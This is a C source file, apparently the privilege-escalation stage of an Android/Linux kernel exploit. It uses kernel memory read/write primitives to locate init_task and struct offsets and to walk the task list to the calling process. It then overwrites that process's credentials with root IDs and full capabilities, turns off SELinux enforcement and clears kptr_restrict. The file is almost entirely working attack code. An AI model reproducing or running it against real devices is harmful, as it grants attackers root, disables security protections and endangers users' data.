#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <libgen.h>
#include <stddef.h>
#include "util.h"

struct tasks_info info = {
    .loc_init_task = NULL,
    .loc_curr_task = NULL,
    .loc_init_files = NULL,
    .tasks_offset = 0,
    .comm_offset = 0,
    .file_offset = 0,
};


int patch_cred(struct cred *cred) {
    struct cred fake_cred;
    int ret;
    int skip = offsetof(struct cred, uid);
    kuid_t patched_uid = 0;
    kgid_t patched_gid = 0;
    kernel_cap_t fake_cap = {.cap = {0xffffffff, 0xffffffff}};

    memset(&fake_cred, 0, sizeof(fake_cred));
    fake_cred.uid = patched_uid;
    fake_cred.gid = patched_gid;
    fake_cred.suid = patched_uid;
    fake_cred.sgid = patched_gid;
    fake_cred.euid = patched_uid;
    fake_cred.egid = patched_gid;
    fake_cred.fsuid = patched_uid;
    fake_cred.fsgid = patched_gid;
    memcpy(&(fake_cred.cap_inheritable), &fake_cap, sizeof(kernel_cap_t));
    memcpy(&(fake_cred.cap_permitted), &fake_cap, sizeof(kernel_cap_t));
    memcpy(&(fake_cred.cap_effective), &fake_cap, sizeof(kernel_cap_t));
    memcpy(&(fake_cred.cap_bset), &fake_cap, sizeof(kernel_cap_t));
    
    ret = mwrite((char *) &(fake_cred) + skip, (char *) cred + skip, sizeof(fake_cred) - skip);  
    if (ret == -1) {
        perror("[!] patch_cred mwrite");
        return -1;
    }
    return 0;
}

int patch_kptr_restrict() {
    int kptr_restrict = 0;
    int ret;

    ret = mwrite((char *) &kptr_restrict, (char *) KPTR_RESTRICT, sizeof(kptr_restrict));
    if (ret == -1) {
        perror("[!] patch_kptr_restrict mwrite");
        return -1;
    }
    return 0;
}

int patch_selinux() {
    int selinux_enforcing = 0;
    int ret;

    ret = mwrite((char *) &selinux_enforcing, (char *) SELINUX_ENFORCING, sizeof(selinux_enforcing));
    if (ret == -1) {
        perror("[!] patch_selinux mwrite");
        return -1;
    }
    return 0;
}

/* locate cred offset using comm and task_offset using a known pattern*/
int locate_offsets(char *start, int *tasks_offset, int *cred_offset, int *comm_offset) {
    char buf[PAGE_SIZE];
    char *ptr;
    struct tasks_pattern *cand;
    uint64_t i;
    int ret;

    memset(buf, 0, sizeof(buf));
    ret = mread(buf, start, sizeof(buf));
    if (ret == -1) {
        printf("[!] mread error while locating offsets at %p-%p\n", start, start + sizeof(buf));
        perror("[!] mread");
        return -1;
    }
    printf("[+] read kenel memory %p-%p into buffer, locating offsets\n", start, start + sizeof(buf));
    if ((ptr = memmem(buf, sizeof(buf), INIT_NAME, strlen(INIT_NAME))) >= (char *) sizeof(struct cred *)) {
        *cred_offset = (int) (ptr - buf - sizeof(struct cred *));
        *comm_offset = (int) (ptr - buf);
        // assuming tasks is before cred
        for (i = 0; i < *cred_offset; i+=incr) {
            cand = (struct tasks_pattern *) (buf + i);
            if (IS_KERNEL_PTR(cand->tasks.next) && IS_KERNEL_PTR(cand->tasks.prev) 
                && IS_KERNEL_PTR(cand->pushable_tasks.next) && IS_KERNEL_PTR(cand->pushable_tasks.prev)
                && cand->prio == tpat.prio) {
                *tasks_offset = i;
                return 0;
            }
        }
        printf("[!] located cred at %d, but failed to find tasks offset\n", *cred_offset);
        return -1;
    } else {
        return -1;
    }
}

char *locate_init_task(int *tasks_offset, int *cred_offset, int *comm_offset) {
    uint64_t start;
    int indx;
    struct init_task_pattern *ptr;
    // extra memory so that we can finish searching the entire page
    char buf[PAGE_SIZE + sizeof(pat)];
    char *init_task;
    int ret;
    
    
    for (start = KERNEL_START; start < KERNEL_START + SEARCH_BYTES; start += PAGE_SIZE) {
        memset(buf, 0, sizeof(buf));
        ret = mread(buf, (char *) start, sizeof(buf));
        if (ret == -1) {
            printf("[!] mread error while reading page %p-%p\n", (char *) start, (char *) start + PAGE_SIZE);
            perror("[!] mread");
            break;
        }
        //printf("[+] searching page %p-%p\n", (char *) start, (char *) start + PAGE_SIZE);
        for (indx = 0; indx < sizeof(buf) - sizeof(pat); indx += incr) {
            ptr = (struct init_task_pattern *) (buf + indx);
            if ((ptr->usage == pat.usage) && (ptr->flags == pat.flags) && ((ptr->stack & pat.stack) == 0)) {
                init_task = (char *) (indx - sizeof(long) + start);
                printf("[+] found a candidate of init_task at %p\n", init_task);
                printf("[.] start locating offsets\n");
                ret = locate_offsets(init_task, tasks_offset, cred_offset, comm_offset);
                if (ret != -1) {
                    return init_task;
                } else {
                    printf("[!] failed to locate offsets for candidate %p\n", init_task);
                    return NULL;
                }
            }
        }
    }
    // can't locate init_task
    return NULL;
}

char *find_current_task(char *task_name) {
    char *currtask = info.loc_init_task;
    char comm[TASK_COMM_LEN + 1];
    char buf[TASK_COMM_LEN + 1];
    int ret;

    // truncate name from end
    if (strlen(task_name) > (sizeof(buf) - 1)) {
        strncpy(buf, task_name + strlen(task_name) - sizeof(buf) - 1, sizeof(buf) - 1);
    } else {
        strncpy(buf, task_name, sizeof(buf) - 1);
    }
    do {
        memset(comm, 0, sizeof(comm));
        ret = mread(comm, currtask + info.comm_offset, TASK_COMM_LEN);
        if (ret == -1) {
            printf("[!] find_current_task mread comm %p\n", currtask + info.comm_offset);
            perror("[!] mread");
            return NULL;
        }
        if (!strncmp(comm, buf, sizeof(buf))) {
            return currtask;
        } else {
            //printf("[.] found task '%s' at \t%p\n", comm, currtask);
        }
        ret = mread((char *) &currtask, (currtask + info.tasks_offset), sizeof(currtask));
        if (ret == -1) {
            printf("[!] find_current_task mread tasks %p\n", currtask + info.tasks_offset);
            perror("[!] mread");
            return NULL;
        }
        currtask -= info.tasks_offset;
    // doubly linked list
    } while (currtask != info.loc_init_task);
    return NULL;
}

int escalate(char *name, char *init_task_addr) {
    struct cred *cred;
    char *current_task;
    int tasks_offset, cred_offset, comm_offset;
    int ret;

    name = basename(name);
    if (init_task_addr == NULL) {
        printf("[.] trying to locate init task\n");
        init_task_addr = locate_init_task(&tasks_offset, &cred_offset, &comm_offset);
        if (init_task_addr == NULL) {
            printf("[!] can't locate init_task, try incrementing search region\n");
            return -1;
        }
    } else {
        ret = locate_offsets(init_task_addr - KERNEL_START, &tasks_offset, &cred_offset, &comm_offset);
        if (ret == -1) {
            printf("[!] can't locate tasks offset or cred offset\n");
            return -1;
        }
    }
    printf("[+] init_task: %p\n", init_task_addr);
    printf("[+] tasks_offset: %d\n", tasks_offset);
    printf("[+] cred_offset: %d\n", cred_offset);
    printf("[.] searching for current task ...\n");
    info.loc_init_task = init_task_addr;
    info.tasks_offset = tasks_offset;
    info.cred_offset = cred_offset;
    info.comm_offset = comm_offset;
    current_task = find_current_task(name);
    if (!current_task) {
        printf("[!] can't find task %s\n", name);
        return -1;
    }
    info.loc_curr_task = current_task;
    printf("[+] located current task %s at %p\n", name, current_task);
    ret = mread((char *) &cred, (current_task + cred_offset), sizeof(cred));
    if (ret == -1) {
        perror("[!] mread task");
        return -1;
    }
    printf("[+] task %s cred at %p\n", name, cred);
    ret = patch_cred(cred);
    if (ret == -1) {
        printf("[!] patching cred failed\n");
        return -1;
    }
    printf("[+] cred patched\n");
    ret = patch_selinux(); 
    if (ret == -1) {
        printf("[!] patching selinux failed\n");
        return -1;
    }
    printf("[+] selinux patched\n");
    ret = patch_kptr_restrict();
    if (ret == -1) {
        printf("[!] patching kptr_restrict failed\n");
        return -1;
    }
    printf("[+] kptr_restrict patched\n");
    ret = propagate_syms_info();
    if (ret == -1) {
        printf("[!] reading kallsyms failed\n");
        return -1;
    }
    return 0;
}
